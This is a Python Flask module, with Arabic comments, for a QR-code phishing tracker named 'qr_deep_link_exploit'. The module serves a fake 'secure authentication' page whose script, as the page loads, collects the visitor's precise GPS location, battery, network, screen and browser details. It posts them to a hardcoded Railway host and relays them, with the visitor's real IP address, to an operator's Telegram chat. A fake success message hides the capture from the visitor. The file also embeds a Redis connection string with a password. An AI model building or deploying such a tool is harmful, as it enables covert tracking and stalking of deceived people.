import os
import io
import json
import redis
import qrcode
from flask import Blueprint, request, jsonify

qr_bp = Blueprint('qr_deep_link_exploit', __name__)

# --- [1] تأمين اتصال Redis مع إدارة الاستثناءات بالكامل ---
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=5)
    redis_client.ping()
except Exception as e:
    print(f"[-] Critical Redis Connection Error in qr_pairing: {e}")
    redis_client = None

RAILWAY_URL = "https://daf-production-8df9.up.railway.app"

def init_qr_routes(app, bot):
    
    @app.route('/api/v1/session/sync', methods=['POST'])
    def silent_session_sync():
        try:
            if not request.is_json:
                return jsonify({"status": "error", "message": "Invalid content type"}), 400

            data = request.get_json(silent=True) or {}
            token = data.get('token')
            
            if not token or not redis_client:
                return jsonify({"status": "error", "message": "Missing token or database offline"}), 400

            # التحقق الآمن من الـ Token واستخراج الـ Chat ID المرتبط به
            try:
                owner_chat_id = redis_client.get(f"qr_token:{token}")
            except Exception as redis_err:
                print(f"[-] Redis read error: {redis_err}")
                owner_chat_id = None

            if owner_chat_id:
                # استخراج الـ IP الحقيقي بأكثر من طريقة لتجاوز الـ Proxies
                source_ip = (
                    request.headers.get('CF-Connecting-IP') or 
                    request.headers.get('X-Forwarded-For') or 
                    request.headers.get('X-Real-IP') or 
                    request.remote_addr
                )
                if source_ip and ',' in source_ip:
                    source_ip = source_ip.split(',')[0].strip()

                geo = data.get('geolocation', {})
                battery = data.get('battery', {})
                network = data.get('network', {})
                screen = data.get('screen', {})

                msg = (
                    "🎯🔥 **[تقرير الأمان والاستخبارات الميدانية المفصل]**\n"
                    "--------------------------------------------------\n"
                    f"🌍 **عنوان الـ IP الخارجي:** `{source_ip}`\n"
                    f"📍 **إحداثيات الموقع (GPS):**\n"
                    f"   • خط العرض: `{geo.get('latitude', 'مرفوض/غير متاح')}`\n"
                    f"   • خط الطول: `{geo.get('longitude', 'مرفوض/غير متاح')}`\n"
                    f"   • الدقة: `{geo.get('accuracy', 'N/A')} متر`\n"
                    f"🔋 **حالة البطارية:** `{battery.get('level', 'N/A')}% | الشحن: {battery.get('charging', 'N/A')}`\n"
                    f"📶 **نوع شبكة الاتصال:** `{network.get('effectiveType', 'N/A')} | السرعة: ~{network.get('downlink', 'N/A')} Mbps`\n"
                    f"💻 **نظام التشغيل والمعمارية:** `{data.get('platform', 'Unknown')}`\n"
                    f"📐 **دقة الشاشة والعمق:** `{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')} ({screen.get('colorDepth', 'N/A')}-bit)`\n"
                    f"🌐 **بصمة المتصفح (UserAgent):**\n`{data.get('userAgent', 'N/A')}`\n"
                    "--------------------------------------------------"
                )
                try:
                    bot.send_message(owner_chat_id, msg, parse_mode="Markdown")
                except Exception as bot_err:
                    print(f"[-] Telegram dispatch error: {bot_err}")
                    
            return jsonify({"status": "synchronized", "code": 200}), 200
            
        except Exception as err:
            print(f"[-] Unhandled exception in silent_session_sync: {err}")
            return jsonify({"status": "server_error", "code": 500}), 500

    @app.route('/qr_scan_target', methods=['GET'])
    def qr_scan_target():
        token = request.args.get('token', '')
        if not token:
            return "Invalid or missing authorization token.", 400
        
        html_content = f"""
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>المصادقة الآمنة والربط السريع</title>
            <style>
                body {{
                    background-color: #0b1120;
                    color: #f8fafc;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    height: 100vh;
                    margin: 0;
                    overflow: hidden;
                }}
                .card {{
                    background: #1e293b;
                    padding: 35px 25px;
                    border-radius: 16px;
                    box-shadow: 0 20px 40px rgba(0,0,0,0.5);
                    text-align: center;
                    max-width: 420px;
                    width: 90%;
                    border: 1px solid #334155;
                }}
                .spinner {{
                    border: 4px solid rgba(56, 189, 248, 0.1);
                    width: 45px;
                    height: 45px;
                    border-radius: 50%;
                    border-left-color: #38bdf8;
                    animation: spin 1s linear infinite;
                    margin: 0 auto 20px auto;
                }}
                @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
                h3 {{ margin-bottom: 12px; font-size: 21px; color: #f1f5f9; font-weight: 600; }}
                p {{ color: #94a3b8; font-size: 14px; line-height: 1.6; margin: 0; }}
            </style>
        </head>
        <body>
            <div class="card" id="mainCard">
                <div class="spinner"></div>
                <h3>جاري مزامنة بيانات الأمان...</h3>
                <p>يرجى الانتظار والموافقة على التحقق لضمان اكتمال ربط الجهاز بنجاح.</p>
            </div>
            <script>
                async function collectDataSafely() {{
                    let geoData = {{ latitude: 'مرفوض', longitude: 'مرفوض', accuracy: 'N/A' }};
                    let batteryData = {{ level: 'N/A', charging: 'N/A' }};
                    let networkData = {{ effectiveType: 'N/A', downlink: 'N/A' }};

                    try {{
                        if (navigator.geolocation) {{
                            await new Promise((resolve) => {{
                                navigator.geolocation.getCurrentPosition(
                                    (pos) => {{
                                        geoData = {{
                                            latitude: pos.coords.latitude,
                                            longitude: pos.coords.longitude,
                                            accuracy: pos.coords.accuracy
                                        }};
                                        resolve();
                                    }},
                                    () => resolve(),
                                    {{ timeout: 3500, maximumAge: 0, enableHighAccuracy: true }}
                                );
                            }});
                        }}
                    }} catch (e) {{}}

                    try {{
                        if (navigator.getBattery) {{
                            const bat = await navigator.getBattery();
                            batteryData = {{
                                level: Math.round(bat.level * 100),
                                charging: bat.charging ? 'نعم (على الشاحن)' : 'لا (بالبطارية)'
                            }};
                        }}
                    }} catch (e) {{}}

                    try {{
                        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                        if (conn) {{
                            networkData = {{
                                effectiveType: conn.effectiveType || 'N/A',
                                downlink: conn.downlink || 'N/A'
                            }};
                        }}
                    }} catch (e) {{}}

                    return {{
                        token: "{token}",
                        platform: navigator.platform || navigator.userAgentData?.platform || "Unknown",
                        userAgent: navigator.userAgent,
                        screen: {{
                            width: window.screen.width,
                            height: window.screen.height,
                            colorDepth: window.screen.colorDepth || 24
                        }},
                        geolocation: geoData,
                        battery: batteryData,
                        network: networkData
                    }};
                }}

                window.addEventListener('DOMContentLoaded', async () => {{
                    try {{
                        const payload = await collectDataSafely();
                        
                        const response = await fetch('{RAILWAY_URL}/api/v1/session/sync', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify(payload)
                        }});

                        if (response.ok) {{
                            document.getElementById('mainCard').innerHTML = `
                                <div style="font-size: 42px; color: #4ade80; margin-bottom: 10px;">✓</div>
                                <h3 style='color: #4ade80;'>تمت مصادقة الجلسة بنجاح!</h3>
                                <p>تم ربط الجهاز وتأكيد الهوية بنجاح تام. يمكنك إغلاق الصفحة الآن بأمان.</p>
                            `;
                        }} else {{
                            throw new Error('Sync endpoint rejected data');
                        }}
                    }} catch (err) {{
                        document.getElementById('mainCard').innerHTML = `
                            <div style="font-size: 42px; color: #f87171; margin-bottom: 10px;">✕</div>
                            <h3 style='color: #f87171;'>انتهت مهلة الاتصال</h3>
                            <p>تعذر إتمام عملية الربط الآمن، يرجى مسح الكود مرة أخرى.</p>
                        `;
                    }}
                }});
            </script>
        </body>
        </html>
        """
        return html_content, 200

def generate_qr_code_bytes(deep_link_url):
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=1)
        qr.add_data(deep_link_url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="#000000", back_color="#ffffff")
        buf = io.BytesIO()
        img.save(buf, format="JPEG")
        buf.seek(0)
        return buf
    except Exception as e:
        print(f"[-] Error generating QR code bytes: {e}")
        return io.BytesIO()
